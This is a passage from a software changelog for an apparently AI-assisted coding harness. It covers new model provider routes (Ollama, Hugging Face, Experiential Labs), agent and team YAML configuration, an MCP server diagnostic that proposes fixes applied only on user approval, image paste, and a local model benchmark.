  the rung list from `GET /api/models/<slug>/providers`.
- **Enablement and doctor**: joins the generic `PROVIDER_NAMES`-driven
  `halo providers`/`/providers`/`/model` tables; an init wizard tab (key
  only, stored the same env-file-plus-reference way every other provider
  key is); `halo doctor` checks key presence, gateway reachability, and
  the credits balance.
- **Docs**: `docs/MODELS.md` "Experiential Labs" section (including a
  "How to run" table for Space Bunny Alpha, Nemotron 3.5 Lightning,
  Tencent hy4-preview and TypeSafe's jev-router), `docs/CONFIG.md`,
  `docs/COMMANDS.md`, `docs/SLASH-COMMANDS.md`, and the enablement
  prefix table (which also picked up the `oai:`/`cx:` rows it had been
  missing since those routes shipped).

### Roles wizard

Owner report: "the available models are not listed when you select edit a
role... there aren't models to pick from and/or autocomplete." Leaving
the init wizard's Providers step (Next) now runs ONE live, off-thread
enumeration of every provider `/model` knows (OpenRouter, Anthropic,
Databricks, Hugging Face, OpenAI, Experiential, the Claude Code/Codex
subscriptions, every Ollama host including a LAN one, local servers) --
with the credentials just typed into any tab this run (saved or not)
merged over the saved config, never written to disk by the enumeration
itself; one progress line per provider as it answers, a bounded wait so
a provider that never answers ("not reachable") never blocks the step.
The merged, grouped list (`providers/model_enumeration.py::
build_model_rows` -- the SAME function `Controller.list_models()`/
`/model` now delegates to) is cached for the rest of the wizard run and
reused by the Roles step, the Orgs step and the Summary step.

- **Pick list and autocomplete**: the round-1 role editor (`/roles edit`,
  the wizard's own "Edit roles...") and the org editor's free-text "Role
  or model" field both pick from that same merged, grouped, gym-scored
  list; typing narrows it (prefix/substring); a typed-only ref that
  matches nothing in it still works, with a one-line note. `/roles edit`/
  `/org edit` outside the wizard were already reading the live session's
  own `Controller.list_models()` -- unaffected.
- **The Auto tab**: a second tab in the role editor fills every role in
  one action (`ctrl+a`) from a built-in preset (`local-first`/`balanced`/
  `quality`), an installed TEAM TEMPLATE (below), or `halo gym propose`
  when this machine has saved gym data -- shows one line per role,
  switches back to the table so any row can still be adjusted by hand
  before `ctrl+s`.

### Agent bios and team templates

Owner: "each role should have a yaml file that can be editable too."
Two additive layers (`docs/AGENTS.md`): an **agent bio**
(`halo_harness/agents_yaml.py`, `~/.halo/agents/<name>.yaml`) describes
what one named agent IS -- models/tools/context/limits/output/
environment/acceptance, `extends:` for inheritance; a **team template**
("lineup", `halo_harness/teams_yaml.py`, `~/.halo/teams/<name>.yaml`)
ASSIGNS bios to roles (`agents:`, any number of assignments, several may
share a role, exactly one `role: main`; `roles: {...}` shorthand sugar
expands to the same shape) and positions (`org:`), with `delegation`/
`routing`/`budget`/`escalation`/`pipeline`/`permissions`/`context`
sections stored and shown (not yet enforced -- the 2.0.5 Governor's
job). Applying a template fills the EXISTING role table/org dict through
two resolution functions -- `RolesEditor`/`OrgEditor`/the Auto tab need
no changes to actually use one.

- Shipped starter bios (`general`/`coder`/`tester`/`judge`/`local-small`
  plus this project's own real development-cycle roster --
  `orchestrator`/`implementer`/`verifier`/`reviewer`/`researcher`/
  `release-manager`/`watchdog`) and team templates (`local-first`/
  `balanced`/`quality`, plus `halo-dev-cycle` -- this project's own cycle,
  seven assignments, the flagship multi-agent example).
- Import/export both ways with Claude Code's own `.claude/agents/*.md`
  frontmatter (`agents_md_bridge.py`) -- lossy by design; `docs/AGENTS.md`
  tables exactly which fields round-trip.
- `halo agents list|show|validate|new <name> [--from BIO]|edit|export
  [--claude-md]|import [--claude-md]` and `halo teams list|show|
  validate|new <name> [--from TEMPLATE]|use <name>|export|import`;
  `/agents` (extended with a bios section) and a new `/teams` in the
  TUI; `halo doctor --agents` validates every bio's shape and the ACTIVE
  team template, then runs each bio's own acceptance prompt against a
  real one-shot model call.
- The legacy role table migrates into a generated team template named
  `migrated` plus one bio per distinct model, on the first wizard save
  that sees one with no `migrated` template yet -- announced in one line,
  never runs again once it exists.
- **Dependency**: `pyyaml` added to pyproject (small, pure Python) --
  every bio/team-template YAML read or write goes through it.
- **Docs**: `docs/AGENTS.md` (new), linked from `docs/CONFIG.md`,
  `docs/SLASH-COMMANDS.md`, `docs/ROLES.md`.

### Catalogs

- **Databricks family fallback**: an endpoint id with no row in
  models.dev's own (30-id, already-stale) `databricks` provider entry now
  resolves through the VENDOR's own models.dev entry instead --
  `providers.models_dev.vendor_family_profile_fields` strips a leading
  `databricks-`, normalizes version punctuation (`opus-4-5` ->
  `opus-4.5`, `gemini-3-5-flash` -> `gemini-3.5-flash`; a parameter-count
  id like `gemma-3-12b` is left alone), and parses a Bedrock-style
  external endpoint id (`us-anthropic-claude-sonnet-4-5-20250929-v1-0` ->
  `claude-sonnet-4.5`, read off the serving-endpoints probe's own
  `foundation_model.name`). A row sourced this way carries a "vendor list
  price" marker in the picker; a `state.ready == false` endpoint is
  marked "not ready" there too.
- **The same fallback fills `or:`/`xp:` gaps**: an OpenRouter id with no
  vendored catalog row (keyed off its own `vendor/slug` id) and an `xp:`
  slug this session's cached catalog has no row for yet now resolve real
  context/price through the identical vendor lookup, instead of blank
  columns -- "the same gap Databricks had."
- **`:free` variants sort beside their paid row** in the `/model` picker
  under every sort key (price/context/speed), not just the "name" default
  that already happened to keep them adjacent -- a dedicated fixup pass
  re-glues a `<ref>:free` row next to its own `<ref>` row after the
  numeric re-sort scatters them apart (a free row's own $0 price usually
  sorts it to the front, ahead of its paid sibling, not after).
- **`xp:` contract alignment**, pinned against the gateway's own
  published `https://platform.experientiallabs.ai/llms.txt`: the
  retryable error-code set corrected to match the contract's own "Error
  envelope" table exactly (`gateway_draining`/`deadline_exceeded`/
  `internal_error` are retryable, not fixed; `provider_internal` removed
  -- not a real published code); `unsupported_parameter`'s own wording
  fixed to read as a 400 REFUSAL, never a silent drop; the dropped-field
  disclosure (`x-experiential-ignored-parameters`) now read from the
  response BODY the contract says it actually rides on, with the earlier
  header-based read kept as a defensive fallback; four more per-response
  headers captured (`x-gateway-provider`/`-zdr`/`-route-depth`/
  `-route-reason`, alongside the existing `x-request-id`) and carried on
  the session's own transcript log plus shown in `/xp routes`' new "last
  response" block; `is_byok` now also read from `usage.is_byok` (the
  contract's own stated location, kept alongside the earlier top-level
  read); `experiential.zdr` config key adds a per-request `"provider":
  {"zdr": true}` constraint to both `xp:` request builders; `halo stats
  --experiential --id <x-request-id>` looks up one call's `GET /api/v1/
  generation` for after-the-fact attribution.
- **Docs**: `docs/MODELS.md`'s "Experiential Labs" section gets a "Zero
  data retention" note and an expanded "Errors"/"Cost and credits"/
  "Waterfall" writeup, plus the vendor-family fallback documented under
  "The model table, catalogs, and refresh"; `docs/CONFIG.md`
  (`experiential.zdr`); `docs/COMMANDS.md` (`halo stats --experiential
  --id`).

### MCP deep dive

rolo: "I still cannot reconnect to many of the mcps ... we need like a
doctor deep dive option to fix these with the use of an llm."

- **A server that fails to connect stays listed as down**, with its last
  error AND the wall-clock time it happened (`last failed YYYY-MM-DD
  HH:MM:SS`, next to the reason) in `halo mcp list`/`halo mcp get`/
  `/mcp`; `McpServerHandle.last_error_at`/`tools_fetch_failed_error` are
  new (the latter: the real `tools/list` exception text, not just the
  bare bool) -- the status bar's own N/total already never dropped a
  configured server (verified, not a bug: `McpManager.status()` always
  returns one row per handle regardless of state), pinned here against
  a crashed server alongside a healthy one.
- **`halo doctor --mcp deep [name]` / `D` in `/mcp`**: per server, in
  order, each step bounded by a timeout and recorded with its own
  evidence (masked -- no key-shaped value ever printed): resolve the
  command (PATH, a Windows `.cmd`/`.bat`/`.ps1` shim's own interpreter, a
  bounded `node`/`python`/`uv` `--version`) or the url's shape; a bare
  TCP connect + a real TLS handshake for http/sse/ws; the real stdio/
  http/sse spawn+handshake (`initialize` then `tools/list`, each its own
  step -- a tools/list failure after a clean initialize is its own
  `tools_list` step, not folded into a hard failure) with all stdout/
  stderr captured; an env/PATH diff against the user's shell; the config
  entry's shape against Claude Code's own (user/local/project scope,
  managed, plugin). New `mcp/doctor_probe.py` (the bounded probes) and
  `mcp/doctor_deep.py` (the orchestrator) modules.
- **The model proposes ONE fix per failing server**: the evidence plus
  the server's masked config entry go to the session model (or
  `roles.judge` when configured, via the SAME throwaway-session plumbing
  `halo improve`'s own drafting call already established) with a fixed
  prompt for exactly one line -- `CONFIG_EDIT:`/`INSTALL:`/`PATH:`/
  `URL:`/`ENV:`. Shown always; applied only on a yes (`--apply` on the
  CLI, `A` in `/mcp`; `D` alone only diagnoses) and only for the three
  mechanically-appliable kinds (config edit/path/url -- an install
  command or an env-var name is always advisory, same "the line is for
  you to run" rule `install_hint` already follows, never auto-executed
  or auto-set in your shell). Applying re-tests; a fix that verifies
  healthy is learned by its failure signature (command basename + error
  class + a normalized stderr fingerprint, stable across a changing pid/
  timestamp) in `providers/learned_rules.py`'s new `learn_mcp_fix`/
  `learned_mcp_fix` rows, so the identical failure on ANY server self-
  heals automatically next time -- no model call, no fresh yes needed,
  announced in one line.
- **`/mcp` shows the deep dive as an action** (`D`/`A`, legend updated)
  and each server's own last diagnosis inline (when, the verdict, the
  fix proposed or applied) once one has run, persisted at `~/.halo/
  mcp-diagnosis.json`.
- **Corpus reader**: `halo doctor --mcp deep --from <dir>` reads a
  directory of captured `halo mcp test`/`halo bugreport` output and
  per-server logs (layout documented in `docs/TROUBLESHOOTING.md`) and
  runs the same propose step over the reconstructed evidence -- no live
  server needed, never applies anything (nothing to re-test against);
  for the orchestrator to feed the owner's real failures from a
  different box entirely.
- **Docs**: `docs/TROUBLESHOOTING.md`'s "MCP servers" section gets "The
  deep dive" writeup (steps, fix kinds, learned-rule behaviour, corpus
  layout); `docs/COMMANDS.md` (`halo doctor --mcp deep`); `docs/
  SLASH-COMMANDS.md` (`/mcp`'s `D`/`A`).

## [2.0.3.1] - 2026-10-05
- **The Claude Code bridge server starts inside a job object that forbids
  breakaway**: `spawn_server_detached` retries without
  CREATE_BREAKAWAY_FROM_JOB when CreateProcess denies it (GitHub-hosted
  Windows runners, some launchers); the server runs as a member of the job.

### Clipboard image paste

- **Ctrl+V/Shift+Insert paste a clipboard image, not just text.** When the
  clipboard carries an image, Halo reads it (Windows `Clipboard::GetImage`/
  `Get-Clipboard -Format Image`, WSL through `powershell.exe`, macOS
  `osascript`/`pngpaste`, Linux `wl-paste`/`xclip`/`xsel`, or Pillow's
  `ImageGrab.grabclipboard()` when installed -- no new hard dependency
  either way) and adds an attachment chip, `[Image #1 1024x768]`, to the
  prompt. A pasted/dragged path to an existing `.png`/`.jpg`/`.jpeg`/
  `.gif`/`.webp` file attaches that file the same way instead of inserting
  the path. `/paste` reads the clipboard the same way; `/paste <path>`
  attaches an existing file; `/images` lists pending attachments,
  `/images clear` removes all of them, Backspace the last one (same rule: only
  when the input is nothing but chip labels). Over SSH, where no remote
  clipboard reaches the terminal, one line says so and names `/paste
  <path>`/dragging a file instead.
- **Storage and limits.** A pasted image is saved to
  `~/.halo/attachments/<session-id>/clip-<n>.png`; downscaled (Pillow
  installed, long side over 1568px) or left as-is; refused with one line
  past a 5 MB hard cap. The session log stores the saved PATH, never the
  base64 -- resume/replay re-reads the file to rebuild the real image
  block, with a plain text note instead when the file is gone.
- **Every route actually sends the image** once it reaches a turn:
  `ant:`/`cc:`/`dbx:` Claude keep the native image block; `or:`/`oai:`/
  `hf:`/`xp:`/Databricks-other get an `image_url` data URL (chat
  completions) or a real `input_image` item (the OpenAI Responses
  dialect, previously a visible omission placeholder); `ol:` sends the
  base64 on Ollama's own native `images` field; `cx:` passes the saved
  path with `codex exec -i <path>`. A model whose catalog row says it has
  no vision gets one notice and the saved path rides as plain text
  instead of a provider 400.
- **Print mode and SDK parity**: `--image <path>` (repeatable) on `halo -p`
  attaches images to that one turn; `--input-format stream-json` accepts
  `image` content-block entries (a file path, inline base64, or the full
  Anthropic image-block shape a real Claude Code client already sends).

## [2.0.3] - 2026-10-05

### Launch intro pool

- **The typewriter intro rotates through a pool of lines** instead of
  always `I am just a copy, of a copy, of a copy...`: a random pick from
  `tui/intro_lines.py` on every fresh launch (the Red Dragon line among
  them), `/intro` replays a fresh pick and `/intro <n>` replays line n.
  Add a line by appending to the pool; nothing else changes.

Local and cloud models: Ollama + Hugging Face + the OpenAI API + a Codex
subscription (`plans/2.0.3-ollama-round2-brief.md` and onward). Rounds 1
through 5i landed: research, the `ol:` provider, hardware/host analysis and
roles, the `hf:` route, `hf:local/*`/the shared `/local` view/the init tab,
GPU and Experiential Labs research (docs only), local-model excellence
(fit calibration, constrained tool calls, per-OS doctor checklist),
finding and serving/importing file-backed models, the model gym and
data-driven roles, the experimental Apple Silicon `hf:mlx/*` backend,
enforced offline mode/hybrid escalation/the savings meter, the `oai:`
route, and the `cx:` route with Codex settings read beside Claude Code's.
Round 5h (Experiential Labs fully integrated as its own `xp:` route) was
cut from this version by the owner and moved to 2.0.4 round 1 -- item 5
below, originally reserved for it, instead covers the research-only docs
that did ship. Round 6 (this pass: the user-facing local/cloud-models
guide, the research carry-forward, the live-check record, and this
CHANGELOG/README pass) closes out the version; the Opus review, a fix
pass, and the release tag are still to come.

1. **`ol:` provider on Ollama's native API** (round 2): a new `ollama`
   dialect reaches a local daemon, a named LAN host, or Ollama Cloud, all
   through the identical native `/api/chat` request shape --
   `ol:<model>` (the default host) or `ol:<model>@<hostname>` (an entry in
   `~/.halo/config.json`'s `ollama.hosts`). `options.num_ctx` is computed
   and sent on EVERY request (`min(trained context, host.max_ctx,
   131072)`, never a Modelfile default), `keep_alive` is sent only when
   the host entry configures one (the server's own `OLLAMA_KEEP_ALIVE`
   stands otherwise), and `think` is mapped from the session's effort level
   (graded low/medium/high for gpt-oss, bool for every other thinking
   model). The NDJSON streaming decoder synthesizes its own stable
   `toolu_` tool-call ids (Ollama's wire format sends none, only a 0-based
   index) and maps `done_reason: "length"` onto the existing max-tokens
   stop handling; `done_reason: "load"` retries the turn once when nothing
   has been shown yet. A background `/api/version` probe, a short-TTL
   `/api/tags` + `/api/show` catalog per host, and a cheap real-tool-call
   capability probe (cached per model digest, independent of what
   `/api/show` merely declares) round out this round. Round 2b wires the
   dialect into the agent loop itself (`agent/loop.py`'s request/stream
   dispatch, `headless.py`'s shared credential resolver) -- an `ol:` model
   now runs a full turn, including a tool call, end to end in print mode
   and the TUI. Docs: `docs/MODELS.md` ("Ollama" section + the ref-form
   table), `docs/CONFIG.md` (`ollama.hosts`, `OLLAMA_HOST`/
   `OLLAMA_API_KEY`), `docs/LOCAL-MODELS.md` (round 6, the new guide).
2. **Hardware/host analysis, the fit estimate, and roles** (round 3):
   `/ollama` (TUI dialog) and `halo ollama [--host NAME] [--refresh]`
   (CLI) render one page per configured host -- reachable, version,
   loaded models' `size` vs `size_vram` as one plain offload sentence,
   trained vs. effective context, and the KV-bytes/token figure (standard
   GGML/llama.cpp accounting, not independently re-derived); `halo doctor`
   gains a one-line-per-host Ollama section. The context-ownership rule's
   `fit_estimate` (round 2 always passed `None`) is now real: the largest
   power-of-two context that fits in free GPU memory after a model's own
   weights, from the OS GPU tool for a LOCAL host (`nvidia-smi` on
   Windows/Linux, verified live this round) or a REMOTE host's own
   already-loaded `/api/ps` context when there's one to read, cached
   about a minute so a turn never shells out more than once in that
   window. The `ol:` ProviderProfile's `tools_max` now follows that
   effective context's class (under 16k/16k-32k/32k-64k/64k+ -> 16/32/
   64/128 tools, `ollama.tools_max` overridable, never below this
   platform's own built-in tool count) instead of round 2's permanently-
   unbounded `None` -- the SAME SessionCatalog cap-shrink/LRU-evict `/
   model` already runs on a provider switch does the actual shrinking,
   never a second capping path. Local `ol:` models default to a
   supporting role (the picker's new `u` action pre-selects `small`,
   never main); choosing one as the session's main model anyway prints
   the plain consequence sentence when it doesn't declare tool-calling
   support, and proceeds regardless. `/local <question>` (Ollama-only
   this round) answers from `roles.small` inline, without adding
   anything to the main transcript's context. Fix pass after a live run:
   the fit estimate now consults `/api/ps` before any GPU-memory
   arithmetic (an already-loaded model's own loaded context wins outright,
   never recomputed, so concurrent requests can no longer disagree and
   force a reload), counts other loaded models' `size_vram` as reclaimable
   headroom, and -- when the weights provably don't fit even after that --
   falls back to a conservative 8192 instead of the 131072 hard cap.
   Round 5b (local-model excellence) builds directly on this: `halo
   ollama calibrate <model> [--host NAME] [--start N]` loads a model at a
   candidate `num_ctx` and steps down by powers of two, reading `/api/ps`
   back, until it is fully resident -- the measured `max_full_gpu_ctx`
   (or "does not fit") is recorded in `~/.halo/ollama-fit.json` and never
   expires on its own (re-measured only by an explicit re-run, or
   automatically when the model's digest or the server's version
   changes); the SAME procedure runs automatically the first time a model
   is used on a host with no learned cap, with one plain notice
   (`ollama.auto_calibrate: false` opts out). The context-ownership rule
   now takes that learned cap as its highest-priority "fit" candidate
   (still just one more entry in the same `min()`, never an override that
   bypasses the trained-context/hard-cap ceiling), and a REMOTE host with
   nothing known at all -- the MUST-FIX from a live LAN-host run -- gets a
   conservative 32768 default instead of silently falling through to the
   131072 hard cap (`ollama.hosts[].max_ctx` is the documented explicit
   override). The KV-bytes-per-element constants are corrected from
   llama.cpp's own `ggml-common.h` block structs (q8_0 1.0625, q4_0
   0.5625 -- both old approximations under-counted memory by 6-12%),
   selectable per host via `ollama.hosts[].kv_cache_type`. Multi-GPU: the
   fit estimate now SUMS every detected card's free memory (never the
   minimum) minus a per-card overhead. `ollama.hosts[].ssh: "user@host"`
   adds an OPTIONAL read-only GPU probe over ssh for a remote host
   (never required). Apple Silicon's unified-memory share is estimated
   from total RAM (or `iogpu.wired_limit_mb` when set) and always
   labelled an estimate -- calibration is the ground truth there too. The
   system message/tools/`options` on an `ol:` session are now pinned
   byte-stable turn to turn (so Ollama/llama.cpp can actually reuse the
   cached prompt prefix); the status bar's model chip and `halo ollama`
   now show the last turn's own tokens/second, prefill seconds, and an
   "offloaded" marker. Round 5b part 2 (local-model excellence,
   continued): on the `ollama` dialect (local hosts only) and `hf:local/*`
   servers, a turn Halo decides is EXPECTED to call a tool (tools are
   offered, it isn't the first turn, and the last message is a tool
   result -- `providers/tool_call_schema.py`, the one documented rule
   every caller shares) sends the tool-call schema as the output
   constraint (`format` for `ol:`, alongside `tools` unchanged;
   `response_format` json_schema for `hf:local/*`), falling back to
   unconstrained decoding on a bare 400; a tool call that still fails to
   parse (bad JSON, or a resolved tool whose arguments fail schema
   validation) gets ONE isolated, tools-less local repair round -- the
   exact schema plus the parse error, re-validated before trusting it --
   before the existing plain error ever surfaces; the `ollama`/
   `huggingface` profiles also gain the generic bare-JSON/fenced-JSON
   leak-parser patterns, so a constrained reply that lands in plain text
   instead of native `tool_calls` still gets promoted. VRAM-aware role
   defaults: when the main model is `ol:` on a host where a second
   model's own weights plus the main model's CURRENTLY RESIDENT size
   would exceed the host's total GPU memory, `small`/`researcher`/
   `judge`/`subagent_default`'s TABLE value (never an explicit per-run
   `--role`/`/roles set` override) redirects to the main model instead of
   evicting it -- `/local <question>` applies the same redirection at call
   time; `halo roles`/`/roles` and the picker's `u` action show `(same as
   main: fits beside it: no)` as the reason. `halo ollama doctor [--host
   NAME]` (and `halo doctor`'s matching section) prints the documented
   host-tuning recommendations Halo cannot read back
   (`OLLAMA_FLASH_ATTENTION=1`, `OLLAMA_KV_CACHE_TYPE=q8_0`,
   `OLLAMA_NUM_PARALLEL=1`, `OLLAMA_KEEP_ALIVE`, `OLLAMA_CONTEXT_LENGTH`)
   and exactly where each lives per OS of the host (Windows tray app,
   macOS menu-bar app plus `launchctl setenv`, Linux `systemctl edit
   ollama`), with a one-line hint for a loopback-only host. The `Ollama`/
   `Hugging Face` init-wizard tabs now open with a detection summary (GPU/
   unified memory, Ollama's own models and what fits, running local
   servers, model folders known so far), filled in off the UI thread.
   `mlx_lm.server` (Apple's OpenAI-compatible MLX runtime, same default
   port family as llama-server) is told apart from llama-server by
   whether `/props` answers, labelled `MLX` in `/local`; `mlx-community/*`
   Hub-cache repos are labelled runnable through MLX; LM Studio's own
   model folder (`~/.lmstudio/models`, `huggingface.lmstudio_models_dir`
   overridable) joins the Hub-cache scan under its own group. `halo
   ollama calibrate` now also steps UP from a fitting first guess
   (bounded by the model's own trained context and the 131072 hard cap)
   to find the true ceiling instead of settling for the first lucky guess
   (`--no-up` skips it); the auto-calibrate notice now also surfaces from
   `call_small_model` (via the log, since that call path has no event
   stream of its own to protect) and `_run_compaction` (as an ordinary
   `notification` event), not just the main turn. Docs: `docs/MODELS.md`
   ("Ollama" section: Fit calibration, Host setup checklist, VRAM-aware
   role defaults), `docs/CONFIG.md` (`ollama.tools_max`,
   `ollama.auto_calibrate`, `ollama.hosts[].kv_cache_type`/`.ssh`),
   `docs/COMMANDS.md` (`halo ollama`, `halo ollama calibrate`, `halo
   ollama doctor`), `docs/ROLES.md`, `docs/LOCAL-MODELS.md` (round 6).
3. **`hf:` route -- Hugging Face Inference Providers router and dedicated
   Inference Endpoints** (round 4): a new `huggingface` provider reusing
   the existing openai-chat request/stream code unchanged (no new wire
   format -- tools supported, reasoning passthrough like OpenRouter's own,
   no host-specific fields). `hf:<org>/<model>` (optionally `:fastest`/
   `:cheapest`/`:preferred`/`:<provider>`, passed through verbatim on the
   wire) against the router (`https://router.huggingface.co/v1`,
   `Authorization: Bearer $HF_TOKEN`, `BRIDGE_HF_ROUTER_BASE_URL`
   overridable for tests); `hf:endpoint/<name>` against a fully separate
   `huggingface.endpoints` config entry's own `url`/`token` (mirroring
   `ollama.hosts`' shape) -- the two credential sources never cross-wire.
   An optional `huggingface.bill_to` org name adds `X-HF-Bill-To` on router
   requests only. The router's `GET /v1/models` catalog is cached
   (`~/.halo/huggingface-models.json`, the same TTL knob every other
   network catalog here shares) and surfaces in the `/model` picker under
   a "Hugging Face" group once enabled, with no network cost to the
   picker's first paint when the provider isn't configured. Enablement
   (`HF_TOKEN` present OR at least one endpoint configured), `/providers`/
   `halo providers`/`doctor`'s provider count, and `resolve_model_profile`
   all cover the new provider; a missing/misconfigured credential gives a
   plain message naming the right config key instead of the generic
   "OpenRouter not configured" every other unconfigured chat-dialect route
   used to get mislabeled as. `tests/helpers/mock_openai.py`'s `MockUpstream`
   gained a `path_prefix`/`expected_bearer`/`models_response` constructor
   option so the SAME scripted scenarios serve as the router and endpoint
   stand-ins, rather than a second fake server. Docs: `docs/MODELS.md`
   ("Hugging Face" section, Inference Providers/dedicated endpoints),
   `docs/CONFIG.md` (`HF_TOKEN`, `huggingface.endpoints`,
   `huggingface.bill_to`), `docs/LOCAL-MODELS.md` (round 6).
4. **`hf:local/*`, the shared `/local` view, the init tab** (round 5): a
   new `huggingface.local_servers` config list (`{name, url, api_key,
   default}`, mirroring `ollama.hosts`/`huggingface.endpoints`) names a
   MANUAL local/LAN OpenAI-compatible server -- `hf:local/<model>` (the
   default entry, else the first auto-detected one) or `hf:local/<model>
   @<name>`; a manual entry's own `api_key` is pinned apart from both
   `HF_TOKEN` and an endpoint's own token. Auto-detection probes `GET
   /v1/models` on 127.0.0.1 only, on llama-server/TGI's 8080, vLLM/
   `transformers serve`'s 8000 (treated identically on purpose), and LM
   Studio's 1234 -- overridable via `huggingface.local_probe_ports`/
   `HF_LOCAL_PROBE_PORTS` for tests, gated by `BRIDGE_TEST_NO_BACKGROUND_
   NET` like every other background probe; a manual entry is only ever
   probed on demand (`/local refresh`). Context length is read back from
   `/v1/models` (`max_model_len` for vLLM, other names tried heuristically)
   or, as a fallback, llama-server's own `/props` -- never requested.
   `providers.huggingface_hub_cache` walks `$HF_HUB_CACHE`/`$HF_HOME/hub`/
   `~/.cache/huggingface/hub` for models on disk but not necessarily
   served, reporting size and format (`safetensors`/`gguf`) without
   following a symlink outside the cache. The shared `/local` view
   (`providers.local_models`) merges Ollama hosts, running Hugging Face
   local servers, and the Hub cache into one grouped list -- `/local` (TUI,
   no args) opens a dialog, `halo local [--refresh]`/`/local`'s print-mode
   fallback render the same text; `/local <question>` (round 3) now also
   accepts an `hf:` `roles.small` ref, not just `ol:`. `halo init`'s
   interactive Providers step gains `Ollama (local or LAN)` and `Hugging
   Face` tabs (both additive/skippable; neither joins the OLD sequential
   `--provider`/`--preset` CLI picker, which has no sensible hardcoded
   default model for either). `tests/test_privacy_scan.py` now also scans
   untracked, non-ignored files (`git ls-files --others --exclude-
   standard`), not just tracked ones.

   Round 5c adds a fourth discovery source the user controls directly:
   `huggingface.model_dirs`, a list of folders scanned recursively
   (depth-limited, never following a symlinked subdirectory) for `.gguf`
   files and safetensors/MLX model folders (`config.json` beside
   `*.safetensors`) -- managed with `/local add <path>`/`/local forget
   <path>` (persisted immediately) or the init wizard's new "Local
   models" step (right after Providers; a folder field, a preferred-
   runtime choice, and the SAME detection summary round 5b part 2 already
   built). The fit estimate for any of these three on-disk sources (Hub
   cache, LM Studio, `model_dirs`) now comes straight from the FILE: a
   minimal GGUF header reader (`providers.gguf_header`, magic/version/
   key-value metadata, never reading past the metadata block) and a
   safetensors `config.json` reader (`providers.safetensors_config`) both
   build the identical `model_info` shape `/api/show` already produces,
   feeding round 3's `kv_bytes_per_token`/`fit_estimate` unchanged --
   `halo local` now shows format, size, trained context, quantization,
   and whether anything on this machine can actually run each file.
   Two ways to use one: `halo local serve <model> [--runtime llama-
   server|mlx_lm] [--port N] [--keep]` (or the `/local` dialog's `s` key)
   starts a managed child process on a free loopback port, recorded in
   `~/.halo/run/local-servers.json` and stopped when Halo exits unless
   `--keep`; when no runtime is found, Halo offers to fetch the pinned
   llama.cpp release for this OS/GPU backend (asset chosen from the
   NVIDIA driver's own reported CUDA version, Metal on macOS, Vulkan
   otherwise; verified against the GitHub Releases API's own per-asset
   `digest`, since llama.cpp publishes no checksum file of its own) into
   `~/.halo/runtimes/<version>/`, never on PATH, after a plain consent
   sentence (`--yes` or a stdin yes/no) -- `halo local runtime remove`
   deletes it. `halo local import <model> [--name NAME]` is the other
   way: a Modelfile (`FROM <path>`) and Ollama's own `/api/create`
   (streamed status lines as progress) turn a `.gguf` file into an
   ordinary `ol:<name>` -- GGUF only this round, since Ollama's own
   documented list of importable safetensors architectures wasn't found
   in this round's research. Either way the new model defaults to the
   `small` role, same as any other local model.

   Fix pass after a live run found two defects: the runtime fetch listed
   `GET /releases/latest`, which points at llama.cpp's own most recent
   NON-binary release (the actual compiled builds are prereleases tagged
   `b<number>`) -- Halo now lists `GET /releases` and walks it newest-tag-
   first for one that actually carries the needed asset; the CUDA pick is
   now "same major as the driver with minor <= the driver's, else the
   newest 12.x build, else Vulkan" (a driver reporting CUDA 13.2 with only
   12.4/13.4 builds available correctly falls back to 12.4, never silently
   picks a build its own minor version can't actually run), pulls in the
   paired `cudart-*` redistributable unless a CUDA toolkit is already
   installed, and the consent sentence now names the smaller `--backend
   vulkan` alternative's size; `--backend cuda|vulkan|cpu|metal` overrides
   the pick outright. Separately, the import path's `modelfile`/`FROM
   <path>` form turned out obsolete on a real daemon (`HTTP 400`,
   "neither 'from' or 'files' was specified") -- it now computes the
   file's sha256, uploads the blob (`POST /api/blobs/sha256:<hex>`,
   streamed from disk) only when `HEAD` says Ollama doesn't already have
   it, and calls `/api/create` with a `files` map naming that blob,
   exactly matching a live daemon (build 0.34.2). A second fix pass closed
   a POSIX-only zombie-process bug in the managed-server registry: a bare
   `SIGTERM` with no `wait()`/`waitpid()` left a stopped server as a
   zombie on Kali/WSL (gone in every practical sense, but still "alive" to
   a bare `os.kill(pid, 0)`) -- stopping now reaps a same-process child via
   its retained `Popen` handle, or polls `waitpid`/escalates to `SIGKILL`
   after a grace period for a fresh `halo local stop` process with no
   handle at all; Windows' own termination path is unchanged. Docs:
   `docs/MODELS.md` ("Hugging Face" section: `hf:local/*`, "Finding and
   using file-backed models"), `docs/CONFIG.md`
   (`huggingface.local_servers`, `.local_probe_ports`, `.model_dirs`,
   `.preferred_runtime`, `.lmstudio_models_dir`), `docs/COMMANDS.md`
   (`halo local`, `halo local serve`/`stop`/`import`/`add`/`forget`/
   `runtime remove`), `docs/SLASH-COMMANDS.md` (`/local`),
   `docs/LOCAL-MODELS.md` (round 6).
5. **Research: GPU/host telemetry, and Experiential Labs' gateway**
   (round 5a, round 5g -- docs only, no code). `docs/harness/
   GPU-RESEARCH.md` (round 5a, WebFetch-sourced, URLs per claim): exact
   probe flags per vendor/OS (NVIDIA confirmed live; AMD `rocm-smi`/
   sysfs, Intel `xpu-smi`, Apple `system_profiler` stay UNCONFIRMED --
   no such hardware reachable this round), multi-GPU split arithmetic,
   the llama.cpp release/asset matrix feeding round 5c's runtime fetch,
   KV-cache quantization per backend, and the mlx-lm comparison plan round
   5f's Mac live-check follows -- its corrections (KV bytes/element,
   llama.cpp has no checksum file of its own) are already folded into
   items 2 and 4 above. `docs/harness/EXPERIENTIAL-RESEARCH.md` (round
   5g, WebFetch-sourced): the gateway's request grammar, catalog shape,
   cost field location (`usage.cost`, not top-level), the local `exp run`
   gateway, and the `jev-latest` model -- this slot was originally
   reserved for Experiential Labs' full integration (an `xp:` route); the
   owner cut that scope from 2.0.3 on 2026-10-05 and moved it to 2.0.4
   round 1, so only the research doc ships here. Docs:
   `docs/harness/GPU-RESEARCH.md`, `docs/harness/EXPERIENTIAL-RESEARCH.md`.
6. **The model gym, data-driven roles, and the 60-second acceptance
   check** (round 5d): `halo gym [--models ol:a,ol:b,...] [--roles
   small,judge,...] [--quick]` runs a fixed task battery against each
   local model on THIS machine's own hardware, through the real request/
   decode path -- tool-call accuracy (schema-valid Read calls, with
   malformed/missing ones given exactly one local repair round, counted
   separately from the headline score), edit success (a real Edit call
   applied to a scratch fixture file and diffed), context recall (a
   needle at about 12% depth of a prompt sized to the model's own fitted
   context), instruction adherence (one word when asked for one word, no
   preamble when asked for none), and tokens/second + prefill seconds
   averaged across every real turn sent. `--quick` halves the battery
   size. Results persist at `~/.halo/gym/<host-slug>/<digest>.json` with
   the digest/quantization/fitted-context/Ollama-version/timestamps they
   were measured at; `halo gym show [model]` prints a per-model card.
